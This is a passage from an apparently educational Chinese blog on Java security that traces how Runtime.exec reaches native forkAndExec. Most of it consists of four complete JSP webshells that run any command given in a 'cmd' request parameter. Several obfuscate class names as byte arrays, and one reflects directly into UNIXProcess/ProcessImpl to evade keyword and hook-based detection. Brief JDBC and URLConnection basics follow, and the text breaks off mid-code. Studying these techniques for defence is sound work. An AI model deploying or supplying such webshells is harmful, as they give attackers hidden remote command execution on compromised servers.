<p>通过观察整个调用链我们可以清楚的看到<code>exec</code>方法并不是命令执行的最终点，执行逻辑大致是：</p>
<ol>
<li><code>Runtime.exec(xxx)</code></li>
<li><code>java.lang.ProcessBuilder.start()</code></li>
<li><code>new java.lang.UNIXProcess(xxx)</code></li>
<li><code>UNIXProcess</code>构造方法中调用了<code>forkAndExec(xxx)</code> native方法。</li>
<li><code>forkAndExec</code>调用操作系统级别<code>fork</code>-&gt;<code>exec</code>(*nix)&#x2F;<code>CreateProcess</code>(Windows)执行命令并返回<code>fork</code>&#x2F;<code>CreateProcess</code>的<code>PID</code>。</li>
</ol>
<p>有了以上的调用链分析我们就可以深刻的理解到Java本地命令执行的深入逻辑了，切记<code>Runtime</code>和<code>ProcessBuilder</code>并不是程序的最终执行点!</p>
<h3 id="JSP反射Runtime类命令执行"><a href="#JSP反射Runtime类命令执行" class="headerlink" title="JSP反射Runtime类命令执行"></a>JSP反射Runtime类命令执行</h3><p>如果我们不希望在代码中出现和<code>Runtime</code>相关的关键字，我们可以全部用反射代替。</p>
<h4 id="reflect-cmd-jsp"><a href="#reflect-cmd-jsp" class="headerlink" title="reflect-cmd.jsp"></a>reflect-cmd.jsp</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//定义request接收的参数</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义&quot;java.lang.Runtime&quot;字节变量，隐藏Runtime关键字</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">rt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射获取Runtime类对象</span></span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(rt);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射获取getRuntime方法</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method_getRuntime</span> <span class="operator">=</span> clazz.getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射获取exec方法</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method_exec</span> <span class="operator">=</span> clazz.getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>&#125;),String.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射调用Runtime.getRuntime.exec()方法</span></span><br><span class="line">    <span class="comment">//Object object_getRuntime = method_getRuntime.invoke(null);</span></span><br><span class="line">    <span class="comment">//Object object_exec = method_exec.invoke(object_getRuntime, str);</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> method_exec.invoke(method_getRuntime.invoke(<span class="literal">null</span>), str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射获取Process类的getInputStream方法</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method_getInputStream</span> <span class="operator">=</span> object.getClass().getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>&#125;));</span><br><span class="line">    method_getInputStream.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>((InputStream) method_getInputStream.invoke(object, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;)).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    out.write(result);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ProcessBuilder命令执行"><a href="#ProcessBuilder命令执行" class="headerlink" title="ProcessBuilder命令执行"></a>ProcessBuilder命令执行</h3><p>学习<code>Runtime</code>命令执行的时候我们讲到其最终<code>exec</code>方法会调用<code>ProcessBuilder</code>来执行本地命令，那么我们只需跟踪下Runtime的exec方法就可以知道如何使用<code>ProcessBuilder</code>来执行系统命令了。</p>
<h4 id="process-builder-jsp"><a href="#process-builder-jsp" class="headerlink" title="process-builder.jsp"></a>process-builder.jsp</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="comment">//注意此处用了request.getParameterValues方法，因为ProcessBuilder只能接收字符数组</span></span><br><span class="line">  <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(request.getParameterValues(<span class="string">&quot;cmd&quot;</span>)).start().getInputStream();</span><br><span class="line"></span><br><span class="line">  <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ((a = in.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    baos.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  out.write(baos.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230709215015163.png" alt="image-20230709215015163" style="zoom:80%;" />

<h3 id="JSP反射ProcessBuilder类命令执行"><a href="#JSP反射ProcessBuilder类命令执行" class="headerlink" title="JSP反射ProcessBuilder类命令执行"></a>JSP反射ProcessBuilder类命令执行</h3><h4 id="reflect-processbuilder-jsp"><a href="#reflect-processbuilder-jsp" class="headerlink" title="reflect-processbuilder.jsp"></a>reflect-processbuilder.jsp</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="comment">//接收request数组对象</span></span><br><span class="line">  <span class="type">Object</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//反射获取java.lang.ProcessBuilder类</span></span><br><span class="line">  <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>&#125;));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//反射获取有参构造器</span></span><br><span class="line">  <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(String[].class);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//反射获取start方法</span></span><br><span class="line">  <span class="type">Method</span> <span class="variable">method_start</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//实例化获取对象</span></span><br><span class="line">  <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">  <span class="type">Object</span> <span class="variable">object2</span> <span class="operator">=</span> method_start.invoke(object);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//反射执行getInputStream方法</span></span><br><span class="line">  <span class="type">Method</span> <span class="variable">method_getInputStream</span> <span class="operator">=</span> object2.getClass().getDeclaredMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">  method_getInputStream.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//输出结果</span></span><br><span class="line">  <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>((InputStream) method_getInputStream.invoke(object2, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;)).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  out.write(result);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="UNIXProcess-ProcessImpl"><a href="#UNIXProcess-ProcessImpl" class="headerlink" title="UNIXProcess&#x2F;ProcessImpl"></a>UNIXProcess&#x2F;ProcessImpl</h3><p><code>UNIXProcess</code>和<code>ProcessImpl</code>其实就是最终调用<code>native</code>执行系统命令的类，这个类提供了一个叫<code>forkAndExec</code>的native方法，如方法名所述主要是通过<code>fork&amp;exec</code>来执行本地系统命令。</p>
<p><code>UNIXProcess</code>类的<code>forkAndExec</code>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">forkAndExec</span><span class="params">(<span class="type">int</span> mode, <span class="type">byte</span>[] helperpath,</span></span><br><span class="line"><span class="params">                                   <span class="type">byte</span>[] prog,</span></span><br><span class="line"><span class="params">                                   <span class="type">byte</span>[] argBlock, <span class="type">int</span> argc,</span></span><br><span class="line"><span class="params">                                   <span class="type">byte</span>[] envBlock, <span class="type">int</span> envc,</span></span><br><span class="line"><span class="params">                                   <span class="type">byte</span>[] dir,</span></span><br><span class="line"><span class="params">                                   <span class="type">int</span>[] fds,</span></span><br><span class="line"><span class="params">                                   <span class="type">boolean</span> redirectErrorStream)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure>

<h3 id="反射UNIXProcess-ProcessImpl执行本地命令"><a href="#反射UNIXProcess-ProcessImpl执行本地命令" class="headerlink" title="反射UNIXProcess&#x2F;ProcessImpl执行本地命令"></a>反射UNIXProcess&#x2F;ProcessImpl执行本地命令</h3><h4 id="reflect-processimpl-jsp"><a href="#reflect-processimpl-jsp" class="headerlink" title="reflect-processimpl.jsp"></a>reflect-processimpl.jsp</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="type">byte</span>[] toCString(String s) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes  = s.getBytes();</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(bytes, <span class="number">0</span>, result, <span class="number">0</span>, bytes.length);</span><br><span class="line">        result[result.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InputStream <span class="title function_">start</span><span class="params">(String[] strs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// java.lang.UNIXProcess</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">unixClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">85</span>, <span class="number">78</span>, <span class="number">73</span>, <span class="number">88</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// java.lang.ProcessImpl</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">108</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射创建UNIXProcess或者ProcessImpl</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = Class.forName(unixClass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            clazz = Class.forName(processClass);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取UNIXProcess或者ProcessImpl的构造方法</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> strs != <span class="literal">null</span> &amp;&amp; strs.length &gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span></span><br><span class="line">        <span class="comment">// memory management in Java than in C.</span></span><br><span class="line">        <span class="type">byte</span>[][] args = <span class="keyword">new</span> <span class="title class_">byte</span>[strs.length - <span class="number">1</span>][];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> args.length; <span class="comment">// For added NUL bytes</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = strs[i + <span class="number">1</span>].getBytes();</span><br><span class="line">            size += args[i].length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">        <span class="type">int</span>    <span class="variable">i</span>        <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span>[] arg : args) &#123;</span><br><span class="line">            System.arraycopy(arg, <span class="number">0</span>, argBlock, i, arg.length);</span><br><span class="line">            i += arg.length + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// No need to write NUL bytes explicitly</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] envc    = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span>[] std_fds = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span>  <span class="variable">f0</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// In theory, close() can throw IOException</span></span><br><span class="line">        <span class="comment">// (although it is rather unlikely to happen here)</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (f0 != <span class="literal">null</span>) f0.close();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (f1 != <span class="literal">null</span>) f1.close();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (f2 != <span class="literal">null</span>) f2.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建UNIXProcess或者ProcessImpl实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(</span><br><span class="line">                toCString(strs[<span class="number">0</span>]), argBlock, args.length,</span><br><span class="line">                <span class="literal">null</span>, envc[<span class="number">0</span>], <span class="literal">null</span>, std_fds, <span class="literal">false</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取命令执行的InputStream</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">inMethod</span> <span class="operator">=</span> object.getClass().getDeclaredMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">        inMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (InputStream) inMethod.invoke(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">inputStreamToString</span><span class="params">(InputStream in, String charset)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (charset == <span class="literal">null</span>) &#123;</span><br><span class="line">                charset = <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">int</span>                   <span class="variable">a</span>   <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">byte</span>[]                b   = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(out.toByteArray());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (in != <span class="literal">null</span>)</span><br><span class="line">                in.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String[] str = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span>     <span class="operator">=</span> start(str);</span><br><span class="line">        <span class="type">String</span>      <span class="variable">result</span> <span class="operator">=</span> inputStreamToString(in, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        out.println(result);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<h2 id="JDBC基础（暂时跳过）"><a href="#JDBC基础（暂时跳过）" class="headerlink" title="JDBC基础（暂时跳过）"></a>JDBC基础（暂时跳过）</h2><p><code>JDBC(Java Database Connectivity)</code>是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的API接口(<code>JDBC</code>)，不同的数据库提供商必须实现JDBC定义的接口从而也就实现了对数据库的一系列操作。</p>
<h3 id="JDBC-Connection"><a href="#JDBC-Connection" class="headerlink" title="JDBC Connection"></a>JDBC Connection</h3><p>Java通过<code>java.sql.DriverManager</code>来管理所有数据库的驱动注册，所以如果想要建立数据库连接需要先在<code>java.sql.DriverManager</code>中注册对应的驱动类，然后调用<code>getConnection</code>方法才能连接上数据库。</p>
<p>JDBC定义了一个叫<code>java.sql.Driver</code>的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。<code>java.sql.DriverManager.getConnection(xx)</code>其实就是间接的调用了<code>java.sql.Driver</code>类的<code>connect</code>方法实现数据库连接的。数据库连接成功后会返回一个叫做<code>java.sql.Connection</code>的数据库连接对象，一切对数据库的查询操作都将依赖于这个<code>Connection</code>对象。</p>
<p>JDBC连接数据库的一般步骤:</p>
<ol>
<li>注册驱动，<code>Class.forName(&quot;数据库驱动的类名&quot;)</code>。</li>
<li>获取连接，<code>DriverManager.getConnection(xxx)</code>。</li>
</ol>
<p><strong>JDBC连接数据库示例代码如下:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mysql&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">USERNAME</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">Class.forName(CLASS_NAME);<span class="comment">// 注册JDBC驱动类</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br></pre></td></tr></table></figure>

<h4 id="数据库配置信息"><a href="#数据库配置信息" class="headerlink" title="数据库配置信息"></a>数据库配置信息</h4><h2 id="URLConnection"><a href="#URLConnection" class="headerlink" title="URLConnection"></a>URLConnection</h2><p>在java中，Java抽象出来了一个<code>URLConnection</code>类，它用来表示应用程序以及与URL建立通信连接的所有类的超类，通过<code>URL</code>类中的<code>openConnection</code>方法获取到<code>URLConnection</code>的类对象。</p>
<p>Java中URLConnection支持的协议可以在<code>sun.net.www.protocol</code>看到。</p>
<img src="/image/image-20230710163309746.png" alt="image-20230710163309746" style="zoom:80%;" />

<p>由上图可以看到，支持的协议有以下几个(当前jdk版本:1.7.0_80):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc gopher</span><br></pre></td></tr></table></figure>

<p>虽然看到有<code>gopher</code>，但是<code>gopher</code>实际在jdk8版本以后被阉割了，jdk7高版本虽然存在，但是需要设置</p>
<p>其中每个协议都有一个<code>Handle</code>,<code>Handle</code>定义了这个协议如何去打开一个连接。</p>
<p>我们来使用URL发起一个简单的请求</p>
<h3 id="TestURLConnection"><a href="#TestURLConnection" class="headerlink" title="TestURLConnection"></a>TestURLConnection</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.url;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLConnection</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//定义URL链接</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://blog.ysneko.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打开url连接</span></span><br><span class="line">        <span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> url.openConnection();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置请求参数</span></span><br><span class="line">        urlConnection.setRequestProperty(<span class="string">&quot;user-agent&quot;</span>, <span class="string">&quot;Y5neKO_Browser&quot;</span>);</span><br><span class="line">        <span class="comment">//urlConnection.setConnectTimeout(1000);</span></span><br><span class="line">        <span class="comment">//urlConnection.setReadTimeout(1000);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//建立实际连接</span></span><br><span class="line">        urlConnection.connect();</span><br><span class="line">        <span class="comment">//获取响应字段</span></span><br><span class="line">        urlConnection.getHeaderFields();</span><br><span class="line">        <span class="comment">//通过getInputStream方法获取URL输入流</span></span><br><span class="line">        urlConnection.getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建StringBuilder对象接收输入流获取的内容</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="comment">//创建BufferedReader对象和InputStreamReader对象用来逐步处理URL输入流</span></span><br><span class="line">        <span class="comment">//BufferedReader是阻塞流，需要readLine方法取走才会继续读取</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(urlConnection.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line"></span><br><span class="line">   